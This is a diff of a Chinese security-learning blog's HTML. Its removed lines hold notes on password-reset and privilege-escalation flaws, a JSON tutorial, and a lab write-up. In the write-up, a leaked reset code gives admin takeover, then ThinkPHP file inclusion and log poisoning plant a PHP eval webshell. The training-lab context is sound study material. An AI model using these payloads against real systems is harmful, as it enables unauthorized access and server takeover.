-<h2 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h2><p>有一类验证码，他并不是区分是计算机还是人的公共全自动程序，他是来证明自己身份的，比如微信支付宝，支持短信验证码等。像这种验证码他实际是用来区分你身份的。</p>
-<ol>
-<li>第一种就是找回密码，往邮箱发送明文或密文的密码或者验证码(手机短信验证就是往你手机号码发验证码)通过这样的方法来判断是否是本人。</li>
-<li>第二种发送一个重置密码的链接到邮箱。</li>
-</ol>
-<p>上述的密码找回方法会有什么样的漏洞呢?</p>
-<ol>
-<li>验证码发送后前端返回</li>
-<li>验证码无次数限制可爆破</li>
-<li>验证码可控</li>
-<li>直接修改密码页面</li>
-<li>缺失的身份验证-绑定别人的账号到自己的手机</li>
-<li>越权漏洞-自己验证码通过改包然后修改他们密码</li>
-</ol>
-<h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><h2 id="什么是越权"><a href="#什么是越权" class="headerlink" title="什么是越权"></a>什么是越权</h2><p>越权访问，这类漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得地权限用户账户后，可以利用一些方式绕过权限检查，访问或者操作到原本无权的高权限功能。目前存在两种越权类型:1. 水平越权（修改密码，A密码改B账户密码） 2.垂直越权（修改密码，A密码改管理员账户密码）</p>
-<h2 id="越权测试过程"><a href="#越权测试过程" class="headerlink" title="越权测试过程"></a>越权测试过程</h2><p>登录A用户是，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就达到了水平越权测试。（如果可以查看高权限就达到了垂直越权）</p>
-<p>传参id需要自己检测（uid= id= user=）等，通常使用burp进行爆破传参。（传参可能在get post cookie）</p>
-<p>常见平行越权：不需要输入原密码的修改密码，抓包改用户名或者用户id修改他人密码，修改资料的时候修改用户id，查看订单的时候，遍历订单id等。</p>
-<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>未授权访问就是跨过验证来访问，也是越权的一种。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-json格式解析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">json格式解析</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-12-14T08:14:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="json文件格式"><a href="#json文件格式" class="headerlink" title="json文件格式"></a>json文件格式</h1><h2 id="JSON是什么"><a href="#JSON是什么" class="headerlink" title="JSON是什么"></a>JSON是什么</h2><p>（JavaScript Object Notation）json是一种轻量级的数据交换格式。现在是理想的数据交换语言。</p>
-<h3 id="JSON构建于两种结构："><a href="#JSON构建于两种结构：" class="headerlink" title="JSON构建于两种结构："></a>JSON构建于两种结构：</h3><h4 id="1-“名称-值”对的集合（A-collection-of-name-value-pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）"><a href="#1-“名称-值”对的集合（A-collection-of-name-value-pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）" class="headerlink" title="1.“名称/值”对的集合（A collection of name/value pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）"></a>1.“名称/值”对的集合（A collection of name/value pairs）。（在不同得语言有类似的不同叫法，比如python中有点像字典）</h4><h4 id="2-值得有序列表。（大部分被理解为数组）"><a href="#2-值得有序列表。（大部分被理解为数组）" class="headerlink" title="2. 值得有序列表。（大部分被理解为数组）"></a>2. 值得有序列表。（大部分被理解为数组）</h4><h2 id="JSON的形式"><a href="#JSON的形式" class="headerlink" title="JSON的形式"></a>JSON的形式</h2><p>JSON具有以下这些形式:</p>
-<h3 id="1-对象"><a href="#1-对象" class="headerlink" title="1.对象"></a>1.对象</h3><p>对象是一个无序的“名称/值”对的集合。一个对象以<code>“&#123;&quot;</code>（左括号） 作为开始，<code>”&#125;&quot;</code>（右括号）作为结束。每个名称后面跟一个冒号<code>&quot;:&quot;</code> ,“名称/值”对之间使用<code>&quot;,&quot;</code>分割。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214163749311.png" alt="image-20211214163749311"></p>
-<h3 id="2-数组"><a href="#2-数组" class="headerlink" title="2.数组"></a>2.数组</h3><p>数组是值(value)的有序集合。一个数组以<code>&quot;[&quot;</code>(左中括号),<code>&quot;]&quot;</code>(右中括号)结束。值之间使用<code>&quot;,&quot;</code>分隔。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214163755880.png" alt="image-20211214163755880"></p>
-<p>值可以是双引号括起来的字符串(String)、数值(number)、true、false、null、对象(object)或者数组(array)。这些结构可以嵌套。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214163933136.png" alt="image-20211214163933136"></p>
-<p>字符串(string)是由双引号包围的任意数量unicode字符的集合。使用反斜线转义。一个字符(character)即一个单独的字符串(character string)</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214164226230.png" alt="image-20211214164226230"></p>
-<p>数值(number)也与C或者java的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214164319113.png" alt="image-20211214164319113"></p>
-<h2 id="使用范例"><a href="#使用范例" class="headerlink" title="使用范例"></a>使用范例</h2><h3 id="1-对象的每个属性-键-都要有双引号，否则json数据不能正常加载。"><a href="#1-对象的每个属性-键-都要有双引号，否则json数据不能正常加载。" class="headerlink" title="1.对象的每个属性(键)都要有双引号，否则json数据不能正常加载。"></a>1.对象的每个属性(键)都要有双引号，否则json数据不能正常加载。</h3><p>创建以下形式的json格式的文档：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Solkatt&quot;</span>,<span class="attr">&quot;age&quot;</span>: <span class="number">20</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p>创建以下python测试文件：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.json&quot;</span>,<span class="string">&quot;r&quot;</span>)<span class="keyword">as</span> load_f:</span><br><span class="line">    data=json.load(load_f)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
-
-<p>进行运行</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214165443594.png" alt="image-20211214165443594"></p>
-<p>但是如果把json格式改成这样。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;: &quot;Solkatt&quot;,&quot;age&quot;: 20,&quot;hair&quot;: &quot;yellow&quot;,</span><br><span class="line">  gendle: &quot;man&quot;</span><br><span class="line">&#125;//没有给gendle加双引号</span><br></pre></td></tr></table></figure>
-
-<p>运行报错：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214165736079.png" alt="image-20211214165736079"></p>
-<p>表示需要双引号。</p>
-<h3 id="2-数组和对象可以同时使用（数组加对象）"><a href="#2-数组和对象可以同时使用（数组加对象）" class="headerlink" title="2.数组和对象可以同时使用（数组加对象）"></a>2.数组和对象可以同时使用（数组加对象）</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;BeJson&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://www.bejson.com&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">88</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;isNonProfit&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;address&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;street&quot;</span>: <span class="string">&quot;科技园路.&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;city&quot;</span>: <span class="string">&quot;江苏苏州&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;country&quot;</span>: <span class="string">&quot;中国&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;links&quot;</span>: [</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Google&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://www.google.com&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Baidu&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;SoSo&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://www.SoSo.com&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="python中的JSON"><a href="#python中的JSON" class="headerlink" title="python中的JSON"></a>python中的JSON</h1><h2 id="JSON函数"><a href="#JSON函数" class="headerlink" title="JSON函数"></a>JSON函数</h2><p>Ps:使用json函数需要导入json库</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214171318304.png" alt="image-20211214171318304"></p>
-<h3 id="json-dumps"><a href="#json-dumps" class="headerlink" title="json.dumps"></a>json.dumps</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json.dumps(obj, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, encoding=&quot;utf-8&quot;, default=None, sort_keys=False, **kw)</span><br></pre></td></tr></table></figure>
-
-<p>obj是必须的，用于转换的对象。</p>
-<p>sort_keys参数设置为True时，生成的json对象是按键排序的，sort_keys默认为false</p>
-<p>indent参数可以设置json对象的缩进格式</p>
-<p>separators参数可以设置json对象的分隔符</p>
-<p>json.dumps用于将python对象编码成JSON字符串。</p>
-<p>这里给出以下python原始类型向json类型的转化对照表:</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214171914478.png" alt="image-20211214171914478"></p>
-<p>比如</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">data=[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;solkatt&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>,<span class="string">&quot;gendle&quot;</span>:<span class="string">&quot;man&quot;</span>&#125;]</span><br><span class="line">data2=json.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(data2)</span><br></pre></td></tr></table></figure>
-
-<p>可以转化成json格式的对象类型。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214172200415.png" alt="image-20211214172200415"></p>
-<h3 id="json-dump"><a href="#json-dump" class="headerlink" title="json.dump"></a>json.dump</h3><p>存json文件，将python对象存到json格式的文件中不再使用dumps，而是要用dump：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214173432474.png" alt="image-20211214173432474"></p>
-<p>运行后成功写入:</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214173451625.png" alt="image-20211214173451625"></p>
-<h3 id="json-loads"><a href="#json-loads" class="headerlink" title="json.loads"></a>json.loads</h3><p>json.loads用于解码JSON数据。该函数返回python字段的数据类型。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">data=&#x27;&#123;&quot;name&quot;:&quot;solkatt&quot;,&quot;age&quot;:18,&quot;gendle&quot;:&quot;man&quot;&#125;&#x27;</span><br><span class="line">data2=json.loads(data)</span><br><span class="line">print(data2)</span><br></pre></td></tr></table></figure>
-
-<p>把json格式转化为python的字典</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214173121097.png" alt="image-20211214173121097"></p>
-<h3 id="json-load"><a href="#json-load" class="headerlink" title="json.load"></a>json.load</h3><p>读取json文件，从json文件中读取内容存入到python对象，就是使用load:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">file=open(&quot;data.json&quot;,&quot;r&quot;)</span><br><span class="line">data=json.load(file)</span><br><span class="line">file.close()</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211214173645575.png" alt="image-20211214173645575"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-一次靶场经历wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/14/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86wp/">一次靶场经历WP</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/14/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86wp/" class="archive-article-date">
-  	<time datetime="2021-12-14T08:14:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="一次靶场经历wp"><a href="#一次靶场经历wp" class="headerlink" title="一次靶场经历wp"></a>一次靶场经历wp</h1><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><p>打开网站映入眼帘的是大大的登录界面</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118213938717.png" alt="image-20211118213938717"></p>
-<p>第一个想法是查看页面源代码，想看哈前端有没有什么线索</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118214028069.png" alt="image-20211118214028069"></p>
-<p>发现没有什么有用的信息，接下来，查看登录界面，发现有注册按钮，于是便索性注册一个账号</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118214126039.png" alt="image-20211118214126039"></p>
-<p>这里账号和密码都写的123456789.</p>
-<p>点击注册发现注册成功，回到登录页面进行登录。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118214208582.png" alt="image-20211118214208582"></p>
-<p>发现出题人的提示，告诉了我们应该要的管理员账号是admin，说明就是想办法登录管理员账号。最先看到起有注册功能还有登录。我的第一反应是考的是mysql的<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_36453829/article/details/113889145">截断注入</a>。</p>
-<p>于是创建了很多个账号，都是admin（此处省略很多个空格）1这种。但是都失败了，正值悲伤之际才想起了自己还有忘记密码功能，随即点开。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118214344391.png" alt="image-20211118214344391"></p>
-<p>账号选择填入admin，然后点击发送验证码，弹框出现，验证码发送成功。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118214426044.png" alt="image-20211118214426044"></p>
-<p>但是我们什么都没接收到呀！于是想到用bp抓包看看返回来了什么</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118214900061.png" alt="image-20211118214900061"></p>
-<p>成功get验证码，拿来修改密码，密码改成喜欢的123456</p>
-<h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>再一次登录，登录成功，看到下一个提示：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118215010253.png" alt="image-20211118215010253"></p>
-<p>开心的把url的id改为2发现</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118215039824.png" alt="image-20211118215039824"></p>
-<p>随后又试了几下其他数字，发现除了1和2有正常回显，其余的都会重定向回到当前页面。于是想到换个方式输入2，尝试了?id=4-2，果然就有了新的天地。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118220939855.png" alt="image-20211118220939855"></p>
-<p>这里一看就知道是文件包含漏洞，但是难得是这个框架是在thinkphp（这个框架大佬肯定都很熟悉），这里查询了很多资料，才搞懂了thinkphp的路由规则。找到了文件包含的真正包含路径:</p>
-<p><a target="_blank" rel="noopener" href="http://10.13.1.21/index.php/index/Thisiseasyinclude?1=">http://10.13.1.21/index.php/index/Thisiseasyinclude?1=</a></p>
-<p>然后想到文件包含就一定会想到php伪协议来读取文件，根据题目的提示我们需要尽量想办法包含日志文件，所以这里我们又需要去查找thinkphp5的命名规则和路径。</p>
-<p><a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/b7001fe1d05e390e7282ddf8.html">thinkphp5日志</a></p>
-<p>知道了thinkphp5的日志在runtime/log/202111(今天的年月)/18(今天的日期).log</p>
-<p>来命名</p>
-<p>于是尝试使用文件包含，首先包含一下当前目录下的index.php文件，输入以下payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.13.1.21/index.php/index/Thisiseasyinclude?1=./index.php</span><br></pre></td></tr></table></figure>
-
-<p>发现成功回显</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118222100250.png" alt="image-20211118222100250"></p>
-<p>证明了这里确实是我们想要的文件包含点。于是我们就去找日志文件，这里我特地从网上下载了thinkphp5的源码来看。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118222153743.png" alt="image-20211118222153743"></p>
-<p>于是构建以下payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.13.1.21/index.php/index/Thisiseasyinclude?1=php://filter/read=convert.base64-encode/resource=./../runtime/log/202111/18.log</span><br></pre></td></tr></table></figure>
-
-<p>来读取日志路径。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118222321337.png" alt="image-20211118222321337"></p>
-<p>成功回显。证明我们找对了！</p>
-<h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>第二步的成功接下来就是第三步。现在我们知道了日志文件的地址，也知道了怎么包含日志文件。然后这里又有一个文件包含漏洞。于是我们便想到了日志文件包含拿到webshell。</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">日志文件包含</a></p>
-<p>所以我们首先在以下url中提交php一句话木马:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.13.1.21/index.php/index/Thisiseasyinclude?1=<span class="meta">&lt;?php</span> @eval($_POST[123]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118223313937.png" alt="image-20211118223313937"></p>
-<p>用报错的方式注入一句话木马。</p>
-<p>然后通过antsword连接目标</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118223017488.png" alt="image-20211118223017488"></p>
-<p>发现失败！这就是踩坑的地方。</p>
-<p>重新访问日志文件，想看一下报了什么错。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118223356182.png" alt="image-20211118223356182"></p>
-<p>发现我们构造的payload被浏览器自动转义了</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118223442798.png" alt="image-20211118223442798"></p>
-<p>于是我们用bp抓包的方式修改发送的一句话木马避免转义的发生。</p>
-<p>抓包后情况如下：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118223514796.png" alt="image-20211118223514796"></p>
-<p>接下来用antsword再一次连接服务器，成功连接。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211118223546636.png" alt="image-20211118223546636"></p>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>萌新对于这次的总结就是关于thinkphp是严重的不了解，大佬叫我看官方手册开始学这个。(又多了一项艰巨得任务)这个确实是很必要的。然后就是字符串转义的问题，浏览器会自动的转义一些字符，此时需要记得手动得用bp抓包改一下。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/14/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-php代码审计练习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/">php代码审计练习</a>
+    <h1 class="article-title" itemprop="name">
+      php代码审计练习
     </h1>
   
 
@@ -1411,16 +844,84 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2021/12/14/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86wp/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          一次靶场经历WP
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/11/26/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86%EF%BC%882%EF%BC%89wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">一次靶场经历（2）wp</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -1440,368 +941,14 @@
 
 
 
-
-  
-    <article id="post-一次靶场经历（2）wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
